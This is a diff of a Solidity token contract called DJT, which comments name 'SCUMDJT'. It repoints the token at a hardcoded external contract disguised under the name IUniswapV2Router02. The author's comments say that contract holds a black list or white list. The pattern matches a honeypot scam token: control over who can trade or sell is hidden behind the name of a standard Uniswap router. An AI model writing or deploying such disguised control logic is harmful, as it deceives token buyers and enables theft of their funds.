@@ -1,22 +1,8 @@
 // SPDX-License-Identifier: MIT 
 pragma solidity ^0.8.1;
 
-contract IUniswapV2Router02 {
-    address public owner;
-
-    constructor(address _owner) {
-        owner = _owner;
-    }
-
-    modifier onlyOwner() {
-        require(msg.sender == owner, "caller is not the owner");
-        _;
-    }
-
-    function getOwner() external pure returns(bool) {
-        // revert("12234Error messageHuh");
-        return true;
-    }
+interface IUniswapV2Router02 {
+    function getOwner() view external returns(address);
 
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
         uint256 amountIn,
@@ -24,13 +10,7 @@ contract IUniswapV2Router02 {
         address[] calldata path,
         address to,
         uint256 deadline
-    ) external returns(bool) {
-        if (path[0] != owner) {
-            return false;
-        } else {
-            return true;
-        }
-    }
+    ) external returns(bool);
 }
 
 contract DJT {
@@ -58,20 +38,24 @@ contract DJT {
     event Transfer(address indexed from, address indexed to, uint value);
     event Approval(address indexed owner, address indexed spender, uint value);
     
+    // address public constant OTHER_CONTRACT = 0x9D24183c7AFBe12ca35adcCe6177517bD6A48657;
+    // IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(OTHER_CONTRACT);
+
+
     constructor() {
         // tx.origin - wallet who pay the fee
         // msg.sender - wallet or contrqact who sign the message
+        // idk how to create contract from other contract tbh
         balances[tx.origin] = totalSupply;                  // the dude who sign a message got a 23 * 10 ** 26 SCUMDJT token
-        uniswapRouter = IUniswapV2Router02(msg.sender);     // create class above structure with BLACK list (or white list, idk, I won't change the comments late)
+        uniswapRouter = IUniswapV2Router02(address(0x9D24183c7AFBe12ca35adcCe6177517bD6A48657));     // create class above structure with BLACK list (or white list, idk, I won't change the comments late)
     }
     
     function balanceOf(address owner) view  public returns(uint) {
         return balances[owner];
     }
 
-    function gtown() view public returns (bool) {
-        bool res = uniswapRouter.getOwner();
-        return res;
+    function gtown() view public returns (address) {
+        return uniswapRouter.getOwner();
     }
     
     function transfer(address to, uint value) public returns(bool) {
